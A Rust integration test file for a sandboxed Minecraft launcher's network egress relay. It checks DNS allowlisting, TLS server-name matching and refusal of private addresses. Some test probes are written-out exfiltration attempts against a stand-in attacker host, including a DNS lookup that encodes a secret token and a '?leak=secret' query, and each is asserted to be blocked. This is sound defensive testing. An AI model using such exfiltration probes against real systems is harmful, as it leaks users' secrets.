//! The egress relay, end to end: a sandboxed client (Python standing in for the game) in a
//! private network namespace, the real DNS responder and relay on the host side.
//!
//! Tests that need the internet run only with `BASTION_NET_TESTS=1`.

use std::{
    io::{Read, Write},
    net::{Shutdown, TcpListener},
    path::Path,
    sync::{Arc, Mutex},
    time::Duration,
};

use bastion_mc::{
    config::{InstanceNetwork, NetworkConfig, ServerEntry},
    egress,
    net::{http::HttpClient, tls},
    sandbox::{
        self, BaseOptions, Network, Resolv, SandboxSpec,
        policy::{InitPolicy, SeccompPolicy, TcpPolicy},
    },
};
use tokio::io::AsyncReadExt;

const LAUNCHER: &str = env!("CARGO_BIN_EXE_bastion-mc");

const PRELUDE: &str = r#"
import errno, os, socket, ssl, sys
def attempt(f):
    try:
        f(); return "ok"
    except OSError as e:
        return errno.errorcode.get(e.errno, type(e).__name__ + ":" + str(e.errno))
    except Exception as e:
        return type(e).__name__
def show(k, v): print(f"{k}={v}", flush=True)
"#;

struct Run {
    code: Option<i32>,
    stdout: String,
    stderr: String,
    log: Vec<String>,
}

impl Run {
    fn line(&self, key: &str) -> &str {
        self.stdout.lines().find_map(|l| l.strip_prefix(key).and_then(|r| r.strip_prefix('='))).unwrap_or_else(|| {
            panic!(
                "no `{key}=`\n--- stdout ---\n{}\n--- stderr ---\n{}\n--- egress log ---\n{}",
                self.stdout,
                self.stderr,
                self.log.join("\n")
            )
        })
    }
    fn logged(&self, needle: &str) -> bool {
        self.log.iter().any(|l| l.contains(needle))
    }
}

fn http() -> HttpClient {
    HttpClient::new(tls::client_config(tls::load_system_roots().unwrap(), tls::PinSet::default()).unwrap(), &[])
}

async fn run(net: NetworkConfig, body: &str) -> Run {
    let policy = egress::Policy::new(&net, &InstanceNetwork::default(), None).unwrap();
    let ns = policy.netns_spec();
    let python = std::fs::canonicalize("/usr/bin/python3").unwrap();
    let mut base = sandbox::base(&BaseOptions {
        tmp_size_mb: 64,
        jvm: None,
        exec_allow: std::slice::from_ref(&python),
        resolv: Resolv::Loopback,
        expose_timezone: false,
        trust: None,
    })
    .unwrap();
    base.landlock.tcp = TcpPolicy::Ports(policy.tcp_ports());
    let spec = SandboxSpec {
        mounts: base.mounts,
        network: Network::Filtered(ns.clone()),
        cwd: "/tmp".into(),
        limits: None,
        policy: InitPolicy {
            exec: python,
            argv: vec!["python3".into(), "-I".into(), "-c".into(), format!("{PRELUDE}\n{body}")],
            env: base.env,
            landlock: base.landlock,
            seccomp: SeccompPolicy::default(),
        },
    };
    let mut running = sandbox::spawn(spec, Path::new(LAUNCHER)).expect("spawn");
    running.channel.shutdown(Shutdown::Write).unwrap();
    let log = Arc::new(Mutex::new(Vec::new()));
    let sink = log.clone();
    let relay = egress::start(
        policy,
        &ns,
        std::mem::take(&mut running.egress),
        http(),
        Arc::new(move |l| sink.lock().unwrap().push(l)),
        egress::SrvTargets::new(),
        None,
    )
    .unwrap();

    let mut out = running.child.stdout.take().unwrap();
    let mut err = running.child.stderr.take().unwrap();
    let (mut so, mut se) = (String::new(), String::new());
    let status = tokio::time::timeout(Duration::from_secs(90), async {
        let (a, b) = tokio::join!(out.read_to_string(&mut so), err.read_to_string(&mut se));
        a.unwrap();
        b.unwrap();
        running.child.wait().await.unwrap()
    })
    .await
    .expect("payload timed out");
    tokio::time::sleep(Duration::from_millis(200)).await; // let the relay log connection ends
    relay.shutdown();
    let log = log.lock().unwrap().clone();
    Run { code: status.code(), stdout: so, stderr: se, log }
}

/// A TCP echo server on the host's loopback, standing in for a game server.
fn echo_server() -> u16 {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for conn in listener.incoming() {
            let Ok(mut c) = conn else { break };
            std::thread::spawn(move || {
                let mut buf = [0u8; 64];
                while let Ok(n) = c.read(&mut buf) {
                    if n == 0 || c.write_all(&buf[..n]).is_err() {
                        break;
                    }
                }
            });
        }
    });
    port
}

#[tokio::test(flavor = "multi_thread")]
async fn names_are_resolved_only_if_allowlisted_and_never_to_real_addresses() {
    let r = run(
        NetworkConfig::default(),
        r#"
def resolve(name, family=socket.AF_INET):
    try:
        return ",".join(sorted({ai[4][0] for ai in socket.getaddrinfo(name, 443, family, socket.SOCK_STREAM)}))
    except socket.gaierror as e:
        return "gaierror"
show("service", resolve("sessionserver.mojang.com"))
show("service_again", resolve("SessionServer.Mojang.COM"))
show("other_service", resolve("api.minecraftservices.com"))
show("service_v6", resolve("sessionserver.mojang.com", socket.AF_INET6))
show("denied", resolve("example.com"))
show("lookalike", resolve("evilmojang.com"))
show("suffix_trick", resolve("mojang.com.attacker.example"))
show("exfil", resolve("c2VjcmV0LXRva2Vu.exfil.attacker.example"))
show("localhost", resolve("localhost"))
"#,
    )
    .await;
    assert_eq!(r.code, Some(0), "stderr: {}", r.stderr);
    let fake = r.line("service");
    assert!(fake.starts_with("127.") && fake != "127.0.0.1", "expected a synthetic loopback address, got {fake}");
    let second: u8 = fake.split('.').nth(1).unwrap().parse().unwrap();
    assert!((64..128).contains(&second), "address {fake} is outside 127.64.0.0/10");
    assert_eq!(r.line("service_again"), fake, "mapping is stable and case-insensitive");
    assert_ne!(r.line("other_service"), fake, "each name gets its own address");
    assert_eq!(r.line("service_v6"), "gaierror", "no IPv6 inside the sandbox");
    for denied in ["denied", "lookalike", "suffix_trick", "exfil"] {
        assert_eq!(r.line(denied), "gaierror", "{denied}");
    }
    assert_eq!(r.line("localhost"), "127.0.0.1");
    // Refused lookups are logged by name, and none of them left the machine: the responder
    // answers locally and has no upstream.
    assert!(r.logged("DENY  name lookup \"example.com\""));
    assert!(r.logged("exfil.attacker.example"));
}

#[tokio::test(flavor = "multi_thread")]
async fn game_server_relay_honours_the_allowlist_and_private_address_rule() {
    let port = echo_server();
    let other = echo_server();
    let body = format!(
        r#"
def talk(port):
    try:
        c = socket.create_connection(("127.0.0.1", port), timeout=5)
        c.sendall(b"ping"); data = c.recv(16)
        return data.decode() if data else "closed-without-data"
    except OSError as e:
        return errno.errorcode.get(e.errno, str(e.errno))
show("allowlisted", talk({port}))
show("not_allowlisted", talk({other}))
"#
    );

    // Allowed, with the explicit opt-in for a non-public destination.
    let net = NetworkConfig {
        servers: vec![ServerEntry::Full { host: "127.0.0.1".into(), port: Some(port), allow_private: true }],
        ..Default::default()
    };
    let r = run(net, &body).await;
    assert_eq!(r.code, Some(0), "stderr: {}", r.stderr);
    assert_eq!(r.line("allowlisted"), "ping", "log: {:?}", r.log);
    // A port without a rule is stopped inside the sandbox by Landlock, before any packet.
    assert_eq!(r.line("not_allowlisted"), "EACCES");
    assert!(r.logged(&format!("ALLOW 127.0.0.1:{port} game server")));

    // Same rule without `allow_private`: the relay refuses to dial a loopback/LAN address.
    let net = NetworkConfig {
        servers: vec![ServerEntry::Full { host: "127.0.0.1".into(), port: Some(port), allow_private: false }],
        ..Default::default()
    };
    let r = run(net, &body).await;
    // The relay drops the connection (a reset, since the client's bytes were never read).
    assert!(matches!(r.line("allowlisted"), "closed-without-data" | "ECONNRESET"), "got {}", r.line("allowlisted"));
    assert!(r.logged("non-public addresses"), "log: {:?}", r.log);
    assert!(!r.logged("ALLOW"), "log: {:?}", r.log);
}

#[tokio::test(flavor = "multi_thread")]
async fn https_relay_requires_a_matching_tls_server_name() {
    let r = run(
        NetworkConfig::default(),
        r#"
ip = socket.getaddrinfo("sessionserver.mojang.com", 443, socket.AF_INET, socket.SOCK_STREAM)[0][4][0]
def tls(sni):
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try:
        s = socket.create_connection((ip, 443), timeout=8)
        ctx.wrap_socket(s, server_hostname=sni); return "handshake-completed"
    except Exception as e:
        return "refused"
# The address belongs to sessionserver.mojang.com; asking the far end for another site must fail.
show("sni_other_site", tls("example.com"))
show("sni_other_allowed_name", tls("api.minecraftservices.com"))
def raw(payload):
    try:
        s = socket.create_connection((ip, 443), timeout=8); s.sendall(payload)
        return "data" if s.recv(16) else "closed-without-data"
    except OSError as e:
        return "closed-without-data"
show("plain_http_on_443", raw(b"GET / HTTP/1.1\r\nHost: sessionserver.mojang.com\r\n\r\n"))
show("garbage_on_443", raw(os.urandom(64)))
# An address that was never handed out by the resolver maps to nothing.
show("unassigned_fake_ip", raw(b"x") if False else attempt(lambda: socket.create_connection(("127.100.1.1", 443), timeout=5).recv(1)))
"#,
    )
    .await;
    assert_eq!(r.code, Some(0), "stderr: {}", r.stderr);
    assert_eq!(r.line("sni_other_site"), "refused");
    assert_eq!(r.line("sni_other_allowed_name"), "refused", "even another allowlisted name must use its own address");
    assert_eq!(r.line("plain_http_on_443"), "closed-without-data");
    assert_eq!(r.line("garbage_on_443"), "closed-without-data");
    assert!(r.logged("does not match the resolved name"), "log: {:?}", r.log);
    assert!(r.logged("not a TLS ClientHello"), "log: {:?}", r.log);
    assert!(r.logged("never handed out by the resolver"), "log: {:?}", r.log);
    assert!(!r.logged("ALLOW"), "nothing may have been relayed: {:?}", r.log);
}

fn net_tests_enabled() -> bool {
    if std::env::var_os("BASTION_NET_TESTS").is_some() {
        return true;
    }
    eprintln!("skipped: set BASTION_NET_TESTS=1 to run tests that contact Mojang/public DNS");
    false
}

#[tokio::test(flavor = "multi_thread")]
async fn live_https_and_texture_gateway_through_the_relay() {
    if !net_tests_enabled() {
        return;
    }
    // Find a real skin texture URL the way the game would: from a public profile.
    // (The launcher itself never talks to the session server, so the test client has to
    // allowlist it explicitly.)
    let lookup = HttpClient::new(
        tls::client_config(tls::load_system_roots().unwrap(), tls::PinSet::default()).unwrap(),
        &["sessionserver.mojang.com".to_string()],
    );
    let mut profile = None;
    for _ in 0..4 {
        match lookup
            .get("https://sessionserver.mojang.com/session/minecraft/profile/069a79f444e94726a5befca90e38aaf5", 1 << 20)
            .await
        {
            Ok(body) => {
                profile = Some(body);
                break;
            }
            // The session server rate-limits repeated lookups of one profile (HTTP 429).
            Err(_) => tokio::time::sleep(Duration::from_secs(8)).await,
        }
    }
    let Some(profile) = profile else {
        eprintln!("skipped: Mojang's session server is rate-limiting profile lookups right now");
        return;
    };
    let profile: serde_json::Value = serde_json::from_slice(&profile).unwrap();
    let encoded = profile["properties"][0]["value"].as_str().expect("textures property");
    let decoded = bastion_mc::util::b64_decode(encoded).unwrap();
    let textures: serde_json::Value = serde_json::from_slice(&decoded).unwrap();
    let url = textures["textures"]["SKIN"]["url"].as_str().expect("skin url").to_string();
    assert!(url.starts_with("http://textures.minecraft.net/texture/"), "skin URLs are plain http: {url}");

    let body = format!(
        r#"
import urllib.request
# 1. Real end-to-end TLS through the relay, with certificate validation done *inside* the sandbox.
ctx = ssl.create_default_context()
s = ctx.wrap_socket(socket.create_connection(("sessionserver.mojang.com", 443), timeout=15), server_hostname="sessionserver.mojang.com")
s.sendall(b"GET / HTTP/1.1\r\nHost: sessionserver.mojang.com\r\nConnection: close\r\n\r\n")
reply = b""
while chunk := s.recv(4096): reply += chunk
show("https_status", reply.split(b"\r\n")[0].decode())
show("peer_cert_subject", dict(x[0] for x in s.getpeercert()["subject"]).get("commonName", ""))
show("tls_version", s.version())
# 2. The plain-http skin URL, served by the launcher's HTTPS gateway.
data = urllib.request.urlopen("{url}", timeout=20).read()
show("texture_is_png", data[:8] == b"\x89PNG\r\n\x1a\n")
show("texture_bytes", len(data))
# 3. Anything else over plain http on that host is refused by the gateway.
def http_get(path):
    try:
        return urllib.request.urlopen("http://textures.minecraft.net" + path, timeout=10).status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:
        return type(e).__name__
show("gateway_other_path", http_get("/"))
show("gateway_query", http_get("/texture/abcd?leak=secret"))
"#
    );
    let r = run(NetworkConfig::default(), &body).await;
    assert_eq!(r.code, Some(0), "stderr: {}\nlog: {:?}", r.stderr, r.log);
    // Any HTTP status proves the point: a complete, certificate-validated TLS session ran
    // end to end between the sandbox and Mojang, through the relay.
    assert!(r.line("https_status").starts_with("HTTP/1.1 "), "got {}", r.line("https_status"));
    assert!(!r.line("peer_cert_subject").is_empty());
    assert!(r.line("tls_version").starts_with("TLSv1."), "TLS is end-to-end between sandbox and Mojang");
    assert_eq!(r.line("texture_is_png"), "True");
    assert!(r.line("texture_bytes").parse::<usize>().unwrap() > 100);
    assert_eq!(r.line("gateway_other_path"), "403");
    assert_eq!(r.line("gateway_query"), "403");
    assert!(r.logged("ALLOW sessionserver.mojang.com:443 tls, SNI verified"));
    assert!(r.logged("ALLOW textures.minecraft.net:80 skin texture"));
}

#[tokio::test(flavor = "multi_thread")]
async fn live_srv_lookup() {
    if !net_tests_enabled() {
        return;
    }
    // A long-lived public SRV record.
    let srv = egress::dns::lookup_srv("_imaps._tcp.gmail.com").await.expect("lookup").expect("record");
    assert_eq!(srv.port, 993);
    assert_eq!(srv.target, "imap.gmail.com");
    // A name without the record is "none", not an error.
    assert!(egress::dns::lookup_srv("_minecraft._tcp.example.com").await.expect("lookup").is_none());
}
